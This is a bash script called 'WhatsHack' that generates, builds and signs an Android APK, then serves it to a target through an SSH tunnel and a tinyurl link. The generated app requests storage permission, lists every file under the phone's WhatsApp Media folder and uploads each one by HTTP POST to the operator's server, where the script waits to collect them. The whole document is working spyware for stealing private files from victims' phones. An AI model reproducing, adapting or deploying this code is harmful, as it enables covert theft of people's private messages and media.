#!/bin/bash
# WhatsHack v1.1
# Author: @thelinuxchoice (You don't become a coder by just changing the credits)
# Instagram: @zhe_alhaqy
# Github: https://github.com/ZheHack/whatshack

host="159.89.214.31" #Serveo.net

trap 'printf "\n";stop' 2

stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1


}

dependencies() {


command -v apksigner > /dev/null 2>&1 || { echo >&2 "I require apksigner but it's not installed. Install it. Aborting."; 
exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
exit 1; }

command -v gradle > /dev/null 2>&1 || { echo >&2 "I require gradle but it's not installed. Install it. Aborting."; 
exit 1; }

}

banner() {


printf "\e[1;77m __        ___           _       _   _            _     \n"
printf " \ \      / / |__   __ _| |_ ___| | | | __ _  ___| | __ \n"
printf "  \ \ /\ / /| '_ \ / _\` | __/ __| |_| |/ _\` |/ __| |/ / \n"
printf "   \ V  V / | | | | (_| | |_\__ \  _  | (_| | (__|   <  \n"
printf "    \_/\_/  |_| |_|\__,_|\__|___/_| |_|\__,_|\___|_|\_\ v1.1\e[0m\n"
printf "\n"
printf "     \e[1;92mAuthor: https://github.com/ZheHack/whatshack\n\e[0m"
printf "\n"
}

createapp() {

lazy='\'

if [[ ! -d app/app/src/main/java/com/whatshack/ ]]; then
mkdir -p app/app/src/main/java/com/whatshack/
fi

printf "package com.whatshack;\n" > app/app/src/main/java/com/whatshack/MainActivity.java

printf "import android.content.pm.PackageManager;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.app.Activity;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.support.v4.app.ActivityCompat;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.support.v4.content.ContextCompat;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.support.v7.app.AppCompatActivity;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import java.io.DataInputStream;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import java.io.DataOutputStream;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import java.io.File;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import java.io.FileInputStream;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import java.io.IOException;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import java.net.HttpURLConnection;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import java.net.URL;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.annotation.SuppressLint;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.app.Activity;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.content.Intent;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.net.Uri;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.os.Bundle;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.os.StrictMode;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.util.Log;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.view.Menu;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.view.MenuItem;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import android.widget.Toast;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import org.apache.commons.io.FileUtils;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import org.apache.commons.io.filefilter.TrueFileFilter;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import java.io.IOException;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "import java.util.List;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "@SuppressLint(\"NewApi\")\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "public class MainActivity extends Activity\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "  {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "@Override\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "protected void onCreate(Bundle savedInstanceState)\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "{\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "    super.onCreate(savedInstanceState);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "    setContentView(R.layout.activity_main);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "    StrictMode.ThreadPolicy policy=new StrictMode.ThreadPolicy.Builder().permitAll().build();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "    StrictMode.setThreadPolicy(policy);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "        try {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "checkperm();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "        } catch (Exception e) {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "        }\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "}\n" >> app/app/src/main/java/com/whatshack/MainActivity.java



printf "public void checkperm() {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "       if(ContextCompat.checkSelfPermission(getBaseContext(), \"android.permission.WRITE_EXTERNAL_STORAGE\") == PackageManager.PERMISSION_GRANTED) {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "File dir = new File(\"/storage/emulated/0/WhatsApp/Media/\");\n" >> app/app/src/main/java/com/whatshack/MainActivity.java


printf "		List<File> files = (List<File>) FileUtils.listFiles(dir,\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "		for (File file : files) {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java


printf "try {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            String pathW = file.getCanonicalPath();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "                        upload(pathW);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "} catch (Exception e) {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "            }\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "		}\n" >> app/app/src/main/java/com/whatshack/MainActivity.java


printf "       } else {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            final int REQUEST_CODE_ASK_PERMISSIONS = 123;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            ActivityCompat.requestPermissions(MainActivity.this, new String[]{\"android.permission.WRITE_EXTERNAL_STORAGE\"}, REQUEST_CODE_ASK_PERMISSIONS);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "          checkperm();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "        }\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "}\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf " public void upload(String selectedPath) throws Exception {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "        HttpURLConnection connection = null;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "        DataOutputStream outputStream = null;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "        DataInputStream inputStream = null;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "        String pathToOurFile = selectedPath;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "        String urlServer = \"http://%s:%s/upload_files.php\";\n" $host $port >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "        String lineEnd = \"%sr%sn\";\n" $lazy $lazy >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "        String twoHyphens = \"--\";\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "        String boundary = \"*****\";\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "        int bytesRead, bytesAvailable, bufferSize;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "        byte[] buffer;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "        int maxBufferSize = 1 * 1024 * 1024;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "            FileInputStream fileInputStream = new FileInputStream(new File(\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "                    pathToOurFile));\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "            URL url = new URL(urlServer);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            connection = (HttpURLConnection) url.openConnection();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "            connection.setDoInput(true);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            connection.setDoOutput(true);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            connection.setUseCaches(false);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "            connection.setRequestMethod(\"POST\");\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "            connection.setRequestProperty(\"Connection\", \"Keep-Alive\");\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            connection.setRequestProperty(\"Content-Type\",\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "                    \"multipart/form-data;boundary=\" + boundary);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "            outputStream = new DataOutputStream(connection.getOutputStream());\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            outputStream.writeBytes(twoHyphens + boundary + lineEnd);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            outputStream\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "                    .writeBytes(\"Content-Disposition: form-data; name=%s\"uploadedfile%s\";filename=%s\"\"\n" $lazy $lazy $lazy >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "                            + pathToOurFile + \"%s\"\" + lineEnd);\n" $lazy >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            outputStream.writeBytes(lineEnd);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "            bytesAvailable = fileInputStream.available();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            bufferSize = Math.min(bytesAvailable, maxBufferSize);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            buffer = new byte[bufferSize];\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "            bytesRead = fileInputStream.read(buffer, 0, bufferSize);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "            while (bytesRead > 0) {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "                outputStream.write(buffer, 0, bufferSize);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "                bytesAvailable = fileInputStream.available();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "                bufferSize = Math.min(bytesAvailable, maxBufferSize);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "                bytesRead = fileInputStream.read(buffer, 0, bufferSize);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            }\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "            outputStream.writeBytes(lineEnd);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "            int serverResponseCode = connection.getResponseCode();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            String serverResponseMessage = connection.getResponseMessage();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "            fileInputStream.close();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            outputStream.flush();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "            outputStream.close();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

printf "    }\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
printf "}\n" >> app/app/src/main/java/com/whatshack/MainActivity.java

}

configureapp() {

printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configuring App...\e[0m\n"

createapp
}

checkimg() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting WhatsApp Files,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do

if [[ -e Log.log ]]; then
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] File Received!\e[0m\e[1;77m Saved: app/uploadedfiles/\e[0m\n"
rm -rf Log.log
fi
done 

}

server() {
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"

if [ ! -d uploadedfiles/ ]; then
mkdir uploadedfiles/
fi

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$port':localhost:4444 2> /dev/null > sendlink ' &


sleep 7
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s/app.apk \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/app.apk | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

php -S "localhost:3333" > /dev/null 2>&1 &
php -S "localhost:4444" > /dev/null 2>&1 &
sleep 3
checkimg
}


checkapk() {
if [[ -e app/build/outputs/apk/app-release-unsigned.apk ]]; then

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Build Successful, Signing APK...\e[0m\n"

mv app/build/outputs/apk/app-release-unsigned.apk app.apk
echo "      " | apksigner sign --ks key.keystore  app.apk > /dev/null


printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Done!\e[0m\e[1;92m Saved:\e[0m\e[1;77m app/app.apk \e[0m\n"
fi
default_start_server="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start Server? [Y/n] ' start_server
start_server="${start_server:-${default_start_server}}"
if [[ $start_server == "Y" || $start_server == "Yes" || $start_server == "yes" || $start_server == "y" ]]; then

server
else
exit 1
fi

}

build() {
default_start_build="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start build? [Y/n]: ' start_build
start_build="${start_build:-${default_start_build}}"
if [[ $start_build == "Y" || $start_build == "Yes" || $start_build == "yes" || $start_build == "y" ]]; then
cd app/
gradle build
checkapk
else
exit 1
fi
}

port_conn() {

default_port=$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Choose a Port (Default:\e[0m\e[1;92m %s \e[0m\e[1;77m): \e[0m' $default_port
read port
port="${port:-${default_port}}"

}


start() {

if [[ -e "app/sendlink" ]]; then
rm -rf app/sendlink 
fi
default_sdk_dir="/root/Android/Sdk"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put Location of the SDK (Default /root/Android/Sdk): \e[0m' sdk_dir

sdk_dir="${sdk_dir:-${default_sdk_dir}}"

if [[ ! -d $sdk_dir ]]; then
printf "\e[1;93m[!] Directory Not Found!\e[0m\n"
sleep 1
start
else
printf "sdk.dir=%s\n" > app/local.properties $sdk_dir
port_conn
configureapp
build
fi


}
banner
dependencies
start


